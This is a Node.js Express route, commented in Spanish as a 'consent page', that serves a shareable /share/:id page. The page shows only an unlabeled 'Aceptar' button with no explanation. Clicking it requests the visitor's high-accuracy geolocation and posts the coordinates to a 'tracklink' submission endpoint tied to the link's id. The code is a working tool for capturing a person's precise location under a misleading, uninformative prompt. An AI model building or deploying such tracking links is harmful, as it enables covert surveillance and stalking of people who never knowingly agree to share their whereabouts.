/* =========================
   PÁGINA DE CONSENTIMIENTO
========================= */

app.get("/share/:id", (req, res) => {

  const request = requests.get(req.params.id);

  if (!request) {

    return res.status(404).send(`
<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title></title>

<style>

html,
body {
  margin: 0;
  width: 100%;
  height: 100%;
  background: white;
}

body {
  display: flex;
  align-items: center;
  justify-content: center;
}

button {
  border: 0;
  border-radius: 12px;
  padding: 16px 45px;
  background: #111;
  color: white;
  font-size: 16px;
  font-weight: bold;
  cursor: pointer;
}

</style>
</head>

<body>

<button disabled>
Aceptar
</button>

</body>
</html>
    `);

  }


  res.send(`

<!DOCTYPE html>
<html lang="es">

<head>

<meta charset="UTF-8">

<meta name="viewport"
content="width=device-width, initial-scale=1.0">

<title></title>

<style>

html,
body {

  margin: 0;

  width: 100%;

  height: 100%;

  background: white;

}

body {

  display: flex;

  align-items: center;

  justify-content: center;

}

button {

  border: 0;

  border-radius: 12px;

  padding: 16px 45px;

  background: #111;

  color: white;

  font-size: 16px;

  font-weight: bold;

  cursor: pointer;

}

button:disabled {

  opacity: 0.6;

}

</style>

</head>

<body>

<button id="acceptButton">
Aceptar
</button>


<script>

const button =
document.getElementById("acceptButton");


button.addEventListener(
"click",
function () {

  if (!navigator.geolocation) {

    return;

  }


  button.disabled = true;


  navigator.geolocation.getCurrentPosition(

    async function (position) {

      const data = {

        latitude:
          position.coords.latitude,

        longitude:
          position.coords.longitude,

        accuracy:
          position.coords.accuracy

      };


      try {

        const response =
          await fetch(
            "/api/tracklink/submit/${req.params.id}",
            {
              method: "POST",

              headers: {
                "Content-Type":
                  "application/json"
              },

              body:
                JSON.stringify(data)
            }
          );


        if (!response.ok) {

          button.disabled = false;

        }

      } catch (error) {

        console.error(error);

        button.disabled = false;

      }

    },

    function (error) {

      console.error(error);

      button.disabled = false;

    },

    {

      enableHighAccuracy: true,

      timeout: 15000,

      maximumAge: 0

    }

  );

});

</script>

</body>

</html>

  `);

});
